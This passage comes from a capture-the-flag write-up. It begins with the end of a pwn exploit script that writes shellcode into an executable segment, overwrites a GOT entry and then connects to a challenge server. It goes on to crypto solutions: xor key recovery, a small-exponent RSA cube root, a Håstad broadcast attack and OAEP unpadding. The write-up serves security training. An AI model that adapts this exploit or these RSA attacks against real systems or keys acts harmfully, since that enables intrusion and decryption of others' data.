    cmds.append(rmt_calc(1, 0x555555562000 - 0x555555554000, OP_ADD, MODE_IMM))
    # write shell code to rwx segment
    offset = 0
    for val in sc_value:
        val_hi = (val >> 32) & 0xffffffff
        val_low = val & 0xffffffff
        cmds.append(rmt_calc(10, val_hi, OP_ASSIGN, MODE_IMM))
        cmds.append(rmt_calc(9, val_low, OP_ASSIGN, MODE_IMM))
        cmds.append(rmt_calc(8, 32, OP_ASSIGN, MODE_IMM))
        cmds.append(rmt_calc(10, 8, OP_LSHIFT, MODE_REG))
        cmds.append(rmt_calc(10, 9, OP_OR, MODE_REG))
        cmds.append(rmt_write(10, 1, offset, MODE_64))
        offset += 8
    # get got addr at reg2
    cmds.append(rmt_calc(2, leak_item, OP_ASSIGN, MODE_REG))
    cmds.append(rmt_calc(2, 0x60C0, OP_ADD, MODE_IMM))
    # write got to shellcode addr
    cmds.append(rmt_write(1, 2, 0, MODE_64))
    cmds.append(0xffffffffffffffff)
    context.log_level='debug'
    # io = remote("10.211.55.11", 52112)
    io = remote("challengebox.reply.it", 52112)
    io.sendlineafter('Password:', "workbenchzebra")
    sleep(1)
    io.send(p16(len(cmds) * 8))
    sleep(1)
    io.send(pack_cmds(cmds))
    io.interactive()
## CRYPTO
#### CRYPTO 100
This challenge gives us a encrypt script and the encrypted file. After analyse
the script i found the key is the md5 of a unknow string, and the key just xor
the first 32 bytes of plaintext. Once a byte of plaintext was encrypted by
key,it will be added to the end of the key and encrypt the thirty-second byte
in plaintext behind it.
so we can know that:
    whole key = md5 + plaintext[0:len(plainttext-32)]
The last 65 bytes of plaintext were given to us,so we can use these bytes we
know to xor the ciphertext and recover the plaintext.
#### CRYPTO 200
we are given a file,format is data.
    $ xxd encrypted  
    00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000030: 0000 0000 0000 0000 0000 0004 81eb bfd9  ................
    00000040: d5fc af91 5145 658f af3a 0e86 cd8b d388  ....QEe..:......
    00000050: 3672 699c ed7d 6387 e0e3 a3fa 68c4 921f  6ri..}c.....h...
    00000060: 490e 9ef1 abdc 9f27 ed5f 63e5 add5 7148  I......'._c...qH
    00000070: 4239 ebfe a878 af5e e85d 54aa de15 d938  B9...x.^.]T....8
    00000080: 467b 92cc 8c07 eb4c d8f1 7c14 295b 2986  F{.....L..|.)[).
    00000090: 036d d3b9 ad2d ebd1 4888 0d95 68de 2977  .m...-..H...h.)w
    000000a0: f025 2289 0cb9 47d0 4b3c 3f8f 8b92 3a04  .%"...G.K.m+..n...C/.K.
    000000f0: ff69 106d 8a16 5e01 271a 19d1 be74 2517  .i.m..^.'....t%.
No idea at all how to deal with such file. The organizer gives a hint:
**RSA**.OMG!!!, this is a rsa encrypted ciphertext, since N is very big and e
== 3, so just iroot will recover the message.
    In [88]: c = libnum.s2n(open("encrypted","rb").read())
    In [89]: gmpy2.iroot(c,3)
    Out[89]: 
    (mpz(36001706850048626081616756397544766323378529843646894139063979460807316087805406326896319186794271430700374100321464141081227735087166902804037513083134309703L),
     True)
    In [90]: m = libnum.n2s(3600170685004862608161675639754476632337852984364689413906397946
        ...: 0807316087805406326896319186794271430700374100321464141081227735087166902804037
        ...: 513083134309703L)
    In [91]: m
    Out[91]: '\n}!Erc33Qre0Z:TYS{ :ryvs CVM rug ebs qrra hbl qebjffnc rug fv fvuG'
    In [92]: m[::-1]
    Out[92]: 'Guvf vf gur cnffjbeq lbh arrq sbe gur MVC svyr: {SYT:Z0erQ33crE!}\n'
the message is encrypted with rot13, so recover the flag easily with
[rot13](https://www.rot13.com/):
> flag: This is the password you need for the ZIP file: {FLG:M0reD33peR!}\a
>
> #### CRYPTO 300
>
> The task is a zip file.After unzip it, we get following message:  
>  ```bash  
>  $ tree -al  
>  .  
>  └── home  
>  ├── .cargo  
>  │ └── bin  
>  │ └── base100  
>  ├── .keys  
>  │ ├── pubkey1.pem  
>  │ ├── pubkey2.pem  
>  │ └── pubkey3.pem  
>  └── Mail  
>  └── mbox
5 directories, 5 files
    Gather infomation about this task.
    > [base100](https://github.com/AdamNiederer/base100)
    > three public key with same small e=3, different n, where n1,n2,n3 are coprime!!! **RSA Broadcast Attack**
    ```python
    In [1]: from Crypto.PublicKey import RSA
       ...: import libnum
       ...: import gmpy2
       ...: from base64 import b64decode
       ...: 
       ...: pubkey1 = RSA.importKey(open("pubkey1.pem").read())
       ...: pubkey2 = RSA.importKey(open("pubkey2.pem").read())
       ...: pubkey3 = RSA.importKey(open("pubkey3.pem").read())
       ...: 
       ...: print pubkey1.e
       ...: print pubkey1.n
       ...: print pubkey2.e
       ...: print pubkey2.n
       ...: print pubkey3.e
       ...: print pubkey3.n
       ...: 
    3
    27461240938102113200897173472967117338353862970941479631898743934439184197969934730421588916770108706224321742970311802597907483875609117760952915265756915294486519317125835465418552076936263931036418365556660176672606176106318417615958887675615338303963762961998856932289910599261987402794316615599785954321753677197523630402223417275683243800227784909335489404425069775641916510995967254516594807225839598278056365795172532519304391163607769926236805051039642128965112622904014731728182688108488411683515618049320040345518530697006867452564716512399415241092660425414925204178980508521843356874071745125098712077791
    3
    25729532341092451294531240603979387891663269068925054494644386447578709538200549712194324331007743028407877103888307741934091188143756407222013624779702720382290917003294354053966450051814520421244144339391097773024828092387419578916453522185035851539262003539885806395088735959181862514614229921786903329704181960249900130677918888765813680940161977058425292413968501075642196333018628709714141901549219827667311632057818616952262615085737788512392215874195073722498312750592119469762621027655590907702680840657024789619809001294983274111682135324576250517371609393192128069012335661245230141212036326263247368005689
    3
    29661948132724964616095227795746368402358545784349784235600286377577202933753742052817012601591239801737226934962433653612275935566949707251578632051160376815074974965336910509163875821813472719201779847254599350700653608857398233061073396334555963939196712932498499399996860568569382780663583671102602093159824399656695189722850049090469151885610779385863063132511776225957936227987230406946647771700809951438597193908730256108719036670783287005944737089408722773951543044620377048323576847162239724281695947755648729836251903019780637774106001635595520380198874977211295888721560409084906124570980428674700109696853
> mbox contains three ciphertexts encrypted with three rsa public key the
> encrypted with base100.
**broadcast attack on rsa solver.py**
    import libnum
    from functools import reduce
    import gmpy
    import json, binascii
    def modinv(a, m):
        return int(gmpy.invert(gmpy.mpz(a), gmpy.mpz(m)))
    def chinese_remainder(n, a):
        sum = 0
        prod = reduce(lambda a, b: a * b, n)
        for n_i, a_i in zip(n, a):
            p = prod // n_i
            sum += a_i * modinv(p, n_i) * p
        return int(sum % prod)
    nset = []
    cset = []
    nset.append(pubkey1.n)
    nset.append(pubkey2.n)
    nset.append(pubkey3.n)
    cset.append(libnum.s2n(cc1))
    cset.append(libnum.s2n(cc2))
    cset.append(libnum.s2n(cc3))
    m = chinese_remainder(nset, cset)
    m = int(gmpy.mpz(m).root(3)[0])
    print libnum.n2s(m)
    #plaintext
    '''T\xf8\xb5a\xceT\x8a\xe0\xad\x93vO/7\xfa\xd2\xb1\xb3H\xf9R\xc2\xbf\x85_\x80\xb9\x86\xda!\x19\xd4~\x14y\xbaO\x93\xb9\xbd\xed\xd6\xc1\xfcl|\xd9\x00\x02\xb2\xdf\xf4=\x975\x99
    '''
FLAG is not in the plaintext, so the plaintext must padded. After google. i
found this common padding scheme for
rsa:[OAEP](https://tools.ietf.org/html/rfc3447#section-7.1)
**unpadding script modified on[github](https://github.com/bdauvergne/python-pkcs1)**
    import hashlib
    import binascii
    import exceptions
    def xor(a, b):                  
      return ''.join(chr(ord(i) ^ ord(j)) for i, j in zip(a, b))
    def integer_ceil(a, b):
        '''Return the ceil integer of a div b.'''
        quanta, mod = divmod(a, b)
        if mod:
            quanta += 1
        return quanta
    def integer_byte_size(n):
        '''Returns the number of bytes necessary to store the integer n.'''
        quanta, mod = divmod(integer_bit_size(n), 8)
        if mod or n == 0:
            quanta += 1
        return quanta
    def integer_bit_size(n):
        '''Returns the number of bits necessary to store the integer n.'''
        if n == 0:
            return 1
        s = 0
        while n:
            s += 1
            n >>= 1
        return s
    def bezout(a, b):
        '''Compute the bezout algorithm of a and b, i.e. it returns u, v, p such as:
              p = GCD(a,b)
              a * u + b * v = p
           Copied from http://www.labri.fr/perso/betrema/deug/poly/euclide.html.
        '''
        u = 1
        v = 0
        s = 0
        t = 1
        while b > 0:
            q = a // b
            r = a % b
            a = b
            b = r
            tmp = s
            s = u - q * s
            u = tmp
            tmp = t
            t = v - q * t
            v = tmp
        return u, v, a
    def i2osp(x, x_len):
        '''Converts the integer x to its big-endian representation of length
           x_len.
        '''
        if x > 256**x_len:
            raise exceptions.IntegerTooLarge
        h = hex(x)[2:]
        if h[-1] == 'L':
            h = h[:-1]
        if len(h) & 1 == 1:
            h = '0%s' % h
        x = binascii.unhexlify(h)
        return b'\x00' * int(x_len-len(x)) + x
    def os2ip(x):
        '''Converts the byte string x representing an integer reprented using the
           big-endian convient to an integer.
        '''
        h = binascii.hexlify(x)
        return int(h, 16)
    def mgf1(mgf_seed, mask_len, hash_class=hashlib.sha1):
        '''
           Mask Generation Function v1 from the PKCS#1 v2.0 standard.
           mgs_seed - the seed, a byte string
           mask_len - the length of the mask to generate
           hash_class - the digest algorithm to use, default is SHA1
           Return value: a pseudo-random mask, as a byte string
           '''
        h_len = hash_class().digest_size
        if mask_len > 0x10000:
            raise ValueError('mask too long')
        T = b''
        for i in xrange(0, integer_ceil(mask_len, h_len)):
            C = i2osp(i, 4)
            T = T + hash_class(mgf_seed + C).digest()
        return T[:mask_len]
    def decrypt(label=b'', hash_class=hashlib.sha1,
            mgf=mgf1):
        '''Decrypt a byte message using a RSA private key and the OAEP wrapping algorithm,
           Parameters:
           public_key - an RSA public key
           message - a byte string
           label - a label a per-se PKCS#1 standard
           hash_class - a Python class for a message digest algorithme respecting
             the hashlib interface
           mgf1 - a mask generation function
           Return value:
           the string before encryption (decrypted)
        '''
        hash = hash_class()
        h_len = hash.digest_size
        k = 256
        em = '\x00T\xf8\xb5a\xceT\x8a\xe0\xad\x93vO/7\xfa\xd2\xb1\xb3H\xf9R\xc2\xbf\x85_\x80\xb9\x86\xda!\x19\xd4~\x14y\xbaO\x93\xb9\xbd\xed\xd6\xc1\xfcl|\xd9\x00\x02\xb2\xdf\xf4=\x975\x99'
        # 4. EME-OAEP decoding
        hash.update(label)
        label_hash = hash.digest()
        y, masked_seed, masked_db = em[0], em[1:h_len+1], em[1+h_len:]
        if y != b'\x00' and y != 0:
            raise ValueError('decryption error')
        seed_mask = mgf(masked_db, h_len)
        seed = xor(masked_seed, seed_mask)
        db_mask = mgf(seed, k - h_len - 1)
        db = xor(masked_db, db_mask)
        label_hash_prime, rest = db[:h_len], db[h_len:]
        i = rest.find(b'\x01')
        if i == -1:
            raise exceptions.DecryptionError
        if rest[:i].strip(b'\x00') != b'':
            print(rest[:i].strip(b'\x00'))
            raise exceptions.DecryptionError
        m = rest[i+1:]
        if label_hash_prime != label_hash:
            raise exceptions.DecryptionError
        return m
    print decrypt()
> output
>  
>  
>     $ python rsaes_oaep.py
>     The password is {FLG:Us3fUlB@ckUp}. Do not tell anyone!
>  
#### CRYPTO 400
the task gives three ciphertext
    1P3riYWcuvPwhXMjU5Z8U+zKFCpuYyGpZrQJ
    xPqilMqB6aD7iGA1AItyX6ndUSR9cjA=
    +9POvZ+WoeDwgk01Tb9zVvQ=
base64 decode and loop into byte.